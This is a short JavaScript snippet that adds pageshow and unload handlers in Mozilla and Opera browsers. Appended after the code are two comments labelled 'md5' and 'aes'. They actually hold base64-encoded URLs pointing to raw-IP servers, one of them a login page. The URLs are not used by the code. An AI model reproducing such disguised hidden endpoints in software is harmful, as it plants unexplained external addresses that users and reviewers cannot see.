if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzM1Ljc0LjIwMy4xMzo4MTgxL2luZGV4L3VzZXIvbG9naW4uaHRtbA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/